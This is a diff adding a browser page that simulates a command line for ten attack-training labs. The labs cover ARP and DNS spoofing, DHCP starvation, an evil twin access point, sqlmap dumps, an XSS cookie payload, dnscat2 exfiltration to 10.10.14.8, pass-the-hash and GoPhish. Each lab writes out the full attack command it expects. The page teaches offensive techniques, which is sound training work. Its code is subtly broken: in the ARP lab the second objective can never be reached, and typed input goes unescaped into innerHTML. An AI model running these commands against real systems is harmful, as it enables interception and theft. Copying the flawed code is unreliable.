@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberDefend Interactive Labs | CLI Simulator</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --border: #30363d;
+            --text: #c9d1d9;
+            --text-muted: #8b949e;
+            --accent: #58a6ff;
+            --success: #3fb950;
+            --warning: #d29922;
+            --danger: #f85149;
+            --terminal-bg: #010409;
+            --terminal-green: #3fb950;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.3s ease;
+            z-index: 100;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sidebar-header i {
+            font-size: 24px;
+            color: var(--accent);
+        }
+
+        .sidebar-header h1 {
+            font-size: 1.2rem;
+            font-weight: 700;
+        }
+
+        .sidebar-progress {
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: var(--bg-tertiary);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--success);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .lab-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+        }
+
+        .lab-item {
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid transparent;
+        }
+
+        .lab-item:hover {
+            background: var(--bg-tertiary);
+        }
+
+        .lab-item.active {
+            background: rgba(56, 139, 253, 0.1);
+            border-color: var(--accent);
+        }
+
+        .lab-item.completed {
+            border-left: 4px solid var(--success);
+        }
+
+        .lab-item .lab-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .lab-title {
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .lab-difficulty {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .lab-status {
+            font-size: 1.2rem;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .topbar {
+            padding: 15px 30px;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: var(--text);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .content-area {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        .mission-panel {
+            width: 400px;
+            padding: 30px;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border);
+            overflow-y: auto;
+        }
+
+        .mission-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            background: rgba(56, 139, 253, 0.2);
+            color: var(--accent);
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+        }
+
+        .mission-panel h2 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: var(--text);
+        }
+
+        .mission-panel p {
+            color: var(--text-muted);
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .mission-objectives {
+            background: var(--bg);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            margin-bottom: 20px;
+        }
+
+        .mission-objectives h3 {
+            font-size: 1rem;
+            margin-bottom: 15px;
+            color: var(--warning);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .objective {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+        }
+
+        .objective i {
+            color: var(--text-muted);
+        }
+
+        .objective.completed i {
+            color: var(--success);
+        }
+
+        .objective.completed span {
+            text-decoration: line-through;
+            color: var(--text-muted);
+        }
+
+        .terminal-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: var(--terminal-bg);
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-dot.red { background: #ff5f56; }
+        .terminal-dot.yellow { background: #ffbd2e; }
+        .terminal-dot.green { background: #27c93f; }
+
+        .terminal-output {
+            flex: 1;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: var(--terminal-green);
+            overflow-y: auto;
+            margin-bottom: 15px;
+            line-height: 1.5;
+            white-space: pre-wrap;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            align-items: center;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+        }
+
+        .terminal-prompt {
+            color: var(--accent);
+            margin-right: 10px;
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .toast.show { transform: translateX(0); }
+        .toast.success { border-color: var(--success); }
+        .toast.success i { color: var(--success); }
+        .toast.error { border-color: var(--danger); }
+        .toast.error i { color: var(--danger); }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--bg-tertiary); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--border); }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .sidebar {
+                position: fixed;
+                top: 0;
+                left: 0;
+                height: 100%;
+                transform: translateX(-100%);
+            }
+            .sidebar.open { transform: translateX(0); }
+            .mobile-menu-btn { display: block; }
+            .mission-panel { width: 100%; border-right: none; border-bottom: 1px solid var(--border); max-height: 40vh; }
+            .content-area { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <i class="fa-solid fa-shield-halved"></i>
+            <h1>CyberDefend Labs</h1>
+        </div>
+        <div class="sidebar-progress">
+            <div style="display:flex; justify-content:space-between; font-size:0.85rem; color:var(--text-muted);">
+                <span>Training Progress</span>
+                <span id="progress-text">0 / 10</span>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+        <div class="lab-list" id="lab-list">
+            <!-- Labs injected via JS -->
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <header class="topbar">
+            <button class="mobile-menu-btn" id="menu-btn"><i class="fa-solid fa-bars"></i></button>
+            <div style="font-size: 1.1rem; font-weight:600;" id="current-lab-title">Select a Lab</div>
+            <div style="font-size: 0.9rem; color: var(--text-muted);" id="ip-display">IP: 10.10.14.8</div>
+        </header>
+
+        <div class="content-area">
+            <!-- Mission Details -->
+            <div class="mission-panel" id="mission-panel">
+                <div class="mission-badge">Mission Brief</div>
+                <h2 id="mission-title">Welcome to the Simulator</h2>
+                <p id="mission-desc">Select a lab from the left sidebar to begin your training. Type 'help' in the terminal for instructions.</p>
+                
+                <div class="mission-objectives" id="mission-objectives-container" style="display:none;">
+                    <h3><i class="fa-solid fa-flag"></i> Objectives</h3>
+                    <div id="objectives-list"></div>
+                </div>
+            </div>
+
+            <!-- Terminal -->
+            <div class="terminal-area">
+                <div class="terminal-header">
+                    <div class="terminal-dot red"></div>
+                    <div class="terminal-dot yellow"></div>
+                    <div class="terminal-dot green"></div>
+                </div>
+                <div class="terminal-output" id="terminal-output">Welcome to CyberDefend CLI Simulator. Type 'help' to see available commands.\n\n</div>
+                <div class="terminal-input-line">
+                    <span class="terminal-prompt">root@cyberdefend:~#</span>
+                    <input type="text" class="terminal-input" id="terminal-input" autofocus autocomplete="off">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast">
+        <i class="fa-solid fa-check-circle"></i>
+        <span id="toast-msg">Objective Complete!</span>
+    </div>
+
+    <script>
+        const labs = [
+            {
+                id: 1,
+                title: "Reconnaissance (Nmap)",
+                difficulty: "Beginner",
+                icon: "fa-satellite-dish",
+                desc: "Scan the target network (10.10.10.5) to identify open ports and services running. Use Nmap to perform a service version scan.",
+                objectives: ["Run a version detection scan on 10.10.10.5"],
+                targetIP: "10.10.10.5",
+                check: (cmd) => {
+                    if (cmd.includes("nmap") && cmd.includes("-sV") && cmd.includes("10.10.10.5")) {
+                        return {
+                            success: true,
+                            output: "Starting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 10.10.10.5\nHost is up (0.0005s latency).\nNot shown: 996 closed tcp ports\n\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu\n80/tcp   open  http        Apache httpd 2.4.41\n445/tcp  open  netbios-ssn Samba smbd 4.6.2\n3306/tcp open  mysql       MySQL 5.7.31\n\nNmap done: 1 IP address (1 host up) scanned in 6.42 seconds"
+                        };
+                    }
+                    return { success: false, output: "Invalid command or parameters. Try 'nmap -sV <target>'." };
+                }
+            },
+            {
+                id: 2,
+                title: "ARP Spoofing (MITM)",
+                difficulty: "Intermediate",
+                icon: "fa-user-secret",
+                desc: "Intercept traffic between the victim (10.10.10.5) and the gateway (10.10.10.1) by poisoning their ARP caches. Use arpspoof.",
+                objectives: ["Start ARP spoofing victim to gateway", "Start ARP spoofing gateway to victim"],
+                targetIP: "10.10.10.5",
+                state: { o1: false, o2: false },
+                check: function(cmd) {
+                    let output = "";
+                    let success = false;
+                    
+                    if (cmd.includes("arpspoof") && cmd.includes("-i eth0") && cmd.includes("10.10.10.1") && cmd.includes("10.10.10.5")) {
+                        if (!this.state.o1) {
+                            this.state.o1 = true;
+                            success = true;
+                            output = "0:0:0:0:0:0 0:0:0:0:0:0 0806 42: arp reply 10.10.10.1 is-at 00:11:22:33:44:55\n0:0:0:0:0:0 0:0:0:0:0:0 0806 42: arp reply 10.10.10.1 is-at 00:11:22:33:44:55";
+                        } else {
+                            output = "Already spoofing target to gateway.";
+                        }
+                    } else if (cmd.includes("arpspoof") && cmd.includes("-i eth0") && cmd.includes("10.10.10.5") && cmd.includes("10.10.10.1")) {
+                        if (!this.state.o2) {
+                            this.state.o2 = true;
+                            success = true;
+                            output = "0:0:0:0:0:0 0:0:0:0:0:0 0806 42: arp reply 10.10.10.5 is-at 00:11:22:33:44:55\n0:0:0:0:0:0 0:0:0:0:0:0 0806 42: arp reply 10.10.10.5 is-at 00:11:22:33:44:55";
+                        } else {
+                            output = "Already spoofing gateway to target.";
+                        }
+                    } else {
+                        output = "Invalid syntax. Check arpspoof usage: arpspoof -i [interface] -t [target] [gateway]";
+                    }
+                    return { success, output, objComplete: success };
+                }
+            },
+            {
+                id: 3,
+                title: "DNS Spoofing",
+                difficulty: "Intermediate",
+                icon: "fa-route",
+                desc: "Redirect traffic from 'target.com' to your local IP (10.10.14.8) using a DNS spoofing tool. Simulate launching ettercap with a dns_spoof plugin.",
+                objectives: ["Launch ettercap with DNS spoof plugin"],
+                targetIP: "10.10.14.8",
+                check: (cmd) => {
+                    if (cmd.includes("ettercap") && cmd.includes("-T") && cmd.includes("-M") && cmd.includes("arp") && cmd.includes("-P") && cmd.includes("dns_spoof")) {
+                        return {
+                            success: true,
+                            output: "ettercap 0.8.3.1 Copyright 2001-2020 Ettercap Development Team\nListening on eth0...\n\nScanning the whole netmask for 255 hosts...\n* |==================================================>| 100.00 %\n\n3 hosts added to the hosts list...\n\nActivating dns_spoof plugin...\nDNS SPOOFING: target.com -> 10.10.14.8"
+                        };
+                    }
+                    return { success: false, output: "Command incorrect. Ensure you are using text mode (-T), ARP spoofing (-M arp), and the dns_spoof plugin (-P dns_spoof)." };
+                }
+            },
+            {
+                id: 4,
+                title: "DHCP Starvation",
+                difficulty: "Advanced",
+                icon: "fa-network-wired",
+                desc: "Perform a DHCP starvation attack using Yersinia to exhaust the DHCP server's IP pool on interface eth0.",
+                objectives: ["Launch DHCP starvation attack"],
+                targetIP: "10.10.10.1",
+                check: (cmd) => {
+                    if ((cmd.includes("yersinia") && cmd.includes("-I eth0") && cmd.includes("-attack 2")) || (cmd.includes("yersinia") && cmd.includes("dhcp") && cmd.includes("starvation"))) {
+                        return {
+                            success: true,
+                            output: "Yersinia 0.8.4\nStarting DHCP starvation attack on interface eth0...\nSending DHCP DISCOVER with random MAC: 00:1A:2B:3C:4D:5E\nSending DHCP DISCOVER with random MAC: 00:1A:2B:3C:4D:5F\n[+] DHCP Pool exhausted on 10.10.10.1"
+                        };
+                    }
+                    return { success: false, output: "Invalid command. Try 'yersinia -I eth0 -attack 2'." };
+                }
+            },
+            {
+                id: 5,
+                title: "Wireless (Evil Twin)",
+                difficulty: "Advanced",
+                icon: "fa-wifi",
+                desc: "Create a rogue Access Point with the same SSID as the target to capture handshakes. Use airbase-ng on wlan0mon.",
+                objectives: ["Start airbase-ng rogue AP"],
+                targetIP: "192.168.1.1",
+                check: (cmd) => {
+                    if (cmd.includes("airbase-ng") && cmd.includes("-a 00:11:22:33:44:55") && cmd.includes("-e \"Corp_WiFi\"") && cmd.includes("wlan0mon")) {
+                        return {
+                            success: true,
+                            output: "airbase-ng 1.7\n09:12:34  Created tap interface at0\n09:12:34  Trying to set MTU on at0 to 1500\n09:12:34  Trying to set MTU on wlan0mon to 1800\n09:12:34  Access Point with BSSID 00:11:22:33:44:55 started.\n09:12:40  Client 00:19:07:8B:6A:9C associated (ESSID: Corp_WiFi)"
+                        };
+                    }
+                    return { success: false, output: "Command incorrect. Example: airbase-ng -a [MAC] -e [ESSID] [interface]" };
+                }
+            },
+            {
+                id: 6,
+                title: "SQL Injection",
+                difficulty: "Intermediate",
+                icon: "fa-database",
+                desc: "Exploit a vulnerable login form on http://target.local/login using sqlmap. Dump the users database.",
+                objectives: ["Run sqlmap to dump the database"],
+                targetIP: "target.local",
+                check: (cmd) => {
+                    if (cmd.includes("sqlmap") && cmd.includes("-u \"http://target.local/login\"") && cmd.includes("--data=\"user=admin&pass=123\"") && cmd.includes("--dump")) {
+                        return {
+                            success: true,
+                            output: "sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:\nParameter: user (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n---\n[+] starting dumping tables for database 'webapp_db'\nTable: users\n[2 entries]\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n| 1  | admin    | P@ssw0rd!  |\n| 2  | user1    | letmein123 |\n+----+----------+------------+"
+                        };
+                    }
+                    return { success: false, output: "Syntax error. Make sure to specify URL (-u), POST data (--data), and --dump." };
+                }
+            },
+            {
+                id: 7,
+                title: "Cross-Site Scripting (XSS)",
+                difficulty: "Beginner",
+                icon: "fa-code",
+                desc: "Simulate testing a search box for XSS by injecting a payload that pops up the document cookie.",
+                objectives: ["Input a valid JS payload to steal cookies"],
+                targetIP: "target.local",
+                check: (cmd) => {
+                    const cleaned = cmd.toLowerCase().replace(/\s/g, "");
+                    if (cleaned.includes("<script>alert(document.cookie)</script>") || cleaned.includes("<imgsrc=xonerror=alert(document.cookie)>")) {
+                        return {
+                            success: true,
+                            output: "Executing payload...\n\nAlert triggered: session_id=cyberdefend_secret_session_12345"
+                        };
+                    }
+                    return { success: false, output: "Payload did not trigger. Try a basic script tag payload." };
+                }
+            },
+            {
+                id: 8,
+                title: "Data Exfiltration",
+                difficulty: "Advanced",
+                icon: "fa-arrow-right-from-bracket",
+                desc: "Exfiltrate stolen data (secret.txt) via DNS tunneling using dnscat2 to avoid egress firewall filters.",
+                objectives: ["Start dnscat2 client to exfiltrate data"],
+                targetIP: "10.10.10.5",
+                check: (cmd) => {
+                    if (cmd.includes("dnscat2") && cmd.includes("--host 10.10.14.8") && cmd.includes("--file secret.txt")) {
+                        return {
+                            success: true,
+                            output: "Starting dnscat2...\nEstablishing DNS tunnel to 10.10.14.8...\n[+] Connection established!\nEncoding secret.txt into DNS queries...\n[+] File 'secret.txt' successfully exfiltrated via DNS port 53."
+                        };
+                    }
+                    return { success: false, output: "Command failed. Usage: dnscat2 --host [IP] --file [filename]" };
+                }
+            },
+            {
+                id: 9,
+                title: "Lateral Movement",
+                difficulty: "Advanced",
+                icon: "fa-arrows-left-right",
+                desc: "Move laterally from the compromised web server to the internal Database Server (10.10.10.6) using CrackMapExec with Pass-the-Hash.",
+                objectives: ["Execute CME Pass-the-Hash against 10.10.10.6"],
+                targetIP: "10.10.10.6",
+                check: (cmd) => {
+                    if (cmd.includes("crackmapexec") && cmd.includes("smb") && cmd.includes("10.10.10.6") && cmd.includes("-u Administrator") && cmd.includes("-H") && cmd.includes("aad3b435b51404eeaad3b435b51404ee")) {
+                        return {
+                            success: true,
+                            output: "CME 0.0.1\nSMB         10.10.10.6     445    DB-SERVER       [*] Windows 10 Pro 19041 x64\nSMB         10.10.10.6     445    DB-SERVER       [+] DOMAIN\\Administrator aad3b435b51404eeaad3b435b51404ee (Pwn3d!)"
+                        };
+                    }
+                    return { success: false, output: "Invalid command. Ensure you specify smb, target, user (-u), and NTLM hash (-H)." };
+                }
+            },
+            {
+                id: 10,
+                title: "Phishing (GoPhish)",
+                difficulty: "Intermediate",
+                icon: "fa-fish",
+                desc: "Launch the GoPhish phishing campaign framework to set up a simulated phishing campaign against internal targets.",
+                objectives: ["Start the GoPhish server"],
+                targetIP: "127.0.0.1",
+                check: (cmd) => {
+                    if (cmd === "./gophish" || cmd === "gophish") {
+                        return {
+                            success: true,
+                            output: "   _ __  _____  _____  _____\n  | '_ \\/  _  \\/  _  \\/  _  \\\n  | |_) | (_) | (_) | (_) |\n  | .__/ \\____/\\____/\\____/\n  |_|\n\n[+] GoPhish started successfully\n[+] Admin server listening at: 127.0.0.1:3333\n[+] Phishing server listening at: 0.0.0.0:8080"
+                        };
+                    }
+                    return { success: false, output: "Command not found. Try executing the binary directly." };
+                }
+            }
+        ];
+
+        let currentLab = null;
+        let completedLabs = new Set();
+
+        // DOM Elements
+        const labList = document.getElementById('lab-list');
+        const currentLabTitle = document.getElementById('current-lab-title');
+        const ipDisplay = document.getElementById('ip-display');
+        const missionTitle = document.getElementById('mission-title');
+        const missionDesc = document.getElementById('mission-desc');
+        const missionObjContainer = document.getElementById('mission-objectives-container');
+        const objectivesList = document.getElementById('objectives-list');
+        const terminalOutput = document.getElementById('terminal-output');
+        const terminalInput = document.getElementById('terminal-input');
+        const toast = document.getElementById('toast');
+        const toastMsg = document.getElementById('toast-msg');
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        const sidebar = document.getElementById('sidebar');
+        const menuBtn = document.getElementById('menu-btn');
+
+        // Render Lab List
+        function renderLabs() {
+            labList.innerHTML = '';
+            labs.forEach(lab => {
+                const isCompleted = completedLabs.has(lab.id);
+                const isActive = currentLab && currentLab.id === lab.id;
+                
+                const labEl = document.createElement('div');
+                labEl.className = `lab-item ${isActive ? 'active' : ''} ${isCompleted ? 'completed' : ''}`;
+                labEl.innerHTML = `
+                    <div class="lab-info">
+                        <span class="lab-title">${lab.title}</span>
+                        <span class="lab-difficulty">${lab.difficulty}</span>
+                    </div>
+                    <div class="lab-status">
+                        ${isCompleted ? '<i class="fa-solid fa-check" style="color: var(--success)"></i>' : `<i class="fa-solid ${lab.icon}" style="color: var(--text-muted)"></i>`}
+                    </div>
+                `;
+                labEl.addEventListener('click', () => loadLab(lab));
+                labList.appendChild(labEl);
+            });
+        }
+
+        // Load Lab
+        function loadLab(lab) {
+            currentLab = lab;
+            currentLabTitle.textContent = lab.title;
+            ipDisplay.textContent = `Target IP: ${lab.targetIP}`;
+            missionTitle.textContent = lab.title;
+            missionDesc.textContent = lab.desc;
+            
+            // Reset lab state if it has one
+            if (currentLab.state) {
+                Object.keys(currentLab.state).forEach(k => currentLab.state[k] = false);
+            }
+
+            objectivesList.innerHTML = '';
+            lab.objectives.forEach(obj => {
+                const objEl = document.createElement('div');
+                objEl.className = 'objective';
+                objEl.innerHTML = `<i class="fa-regular fa-circle"></i><span>${obj}</span>`;
+                objectivesList.appendChild(objEl);
+            });
+
+            missionObjContainer.style.display = 'block';
+            terminalOutput.innerHTML = `[*] Lab initialized: ${lab.title}\n[*] Target acquired: ${lab.targetIP}\n[*] Type 'help' for assistance.\n\n`;
+            terminalInput.value = '';
+            
+            renderLabs();
+            if (window.innerWidth <= 900) sidebar.classList.remove('open');
+        }
+
+        // Terminal Logic
+        terminalInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                const cmd = terminalInput.value.trim();
+                terminalOutput.innerHTML += `<span style="color:var(--accent)">root@cyberdefend:~#</span> ${cmd}\n`;
+                
+                if (cmd.toLowerCase() === 'help') {
+                    terminalOutput.innerHTML += `Available commands:\n- help: Show this message\n- clear: Clear terminal\n- labs: List available labs\n`;
+                } else if (cmd.toLowerCase() === 'clear') {
+                    terminalOutput.innerHTML = '';
+                } else if (cmd.toLowerCase() === 'labs') {
+                    labs.forEach(l => terminalOutput.innerHTML += `[${l.id}] ${l.title} (${l.difficulty})\n`);
+                } else if (currentLab) {
+                    const result = currentLab.check(cmd);
+                    
+                    setTimeout(() => {
+                        terminalOutput.innerHTML += result.output + '\n\n';
+                        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        
+                        if (result.success) {
+                            updateObjective();
+                        }
+                    }, 300); // Simulate processing time
+                } else {
+                    terminalOutput.innerHTML += `Command not found: ${cmd}\n`;
+                }
+
+                terminalInput.value = '';
+                terminalOutput.scrollTop = terminalOutput.scrollHeight;
+            }
+        });
+
+        // Update Objective Completion
+        function updateObjective() {
+            const objectives = document.querySelectorAll('.objective');
+            
+            if (currentLab.state) {
+                // For multi-objective stateful labs
+                let allComplete = true;
+                Object.keys(currentLab.state).forEach((key, index) => {
+                    if (currentLab.state[key] && !objectives[index].classList.contains('completed')) {
+                        objectives[index].classList.add('completed');
+                        objectives[index].querySelector('i').className = 'fa-solid fa-check-circle';
+                        showToast(`Objective ${index + 1} Complete!`, true);
+                    }
+                    if (!currentLab.state[key]) allComplete = false;
+                });
+                
+                if (allComplete && !completedLabs.has(currentLab.id)) {
+                    completeLab(currentLab.id);
+                }
+            } else {
+                // For single objective labs
+                if (objectives.length > 0 && !objectives[0].classList.contains('completed')) {
+                    objectives[0].classList.add('completed');
+                    objectives[0].querySelector('i').className = 'fa-solid fa-check-circle';
+                    showToast('Objective Complete!', true);
+                    completeLab(currentLab.id);
+                }
+            }
+        }
+
+        function completeLab(id) {
+            completedLabs.add(id);
+            showToast('Lab Completed Successfully!', true);
+            renderLabs();
+            updateProgress();
+        }
+
+        function updateProgress() {
+            const percent = (completedLabs.size / labs.length) * 100;
+            progressFill.style.width = `${percent}%`;
+            progressText.textContent = `${completedLabs.size} / ${labs.length}`;
+        }
+
+        // Toast
+        function showToast(msg, isSuccess) {
+            toastMsg.textContent = msg;
+            toast.className = 'toast show ' + (isSuccess ? 'success' : 'error');
+            toast.querySelector('i').className = isSuccess ? 'fa-solid fa-check-circle' : 'fa-solid fa-times-circle';
+            
+            setTimeout(() => {
+                toast.className = 'toast';
+            }, 3000);
+        }
+
+        // Mobile Menu
+        menuBtn.addEventListener('click', () => sidebar.classList.toggle('open'));
+
+        // Init
+        renderLabs();
+    </script>
+</body>
+</html>
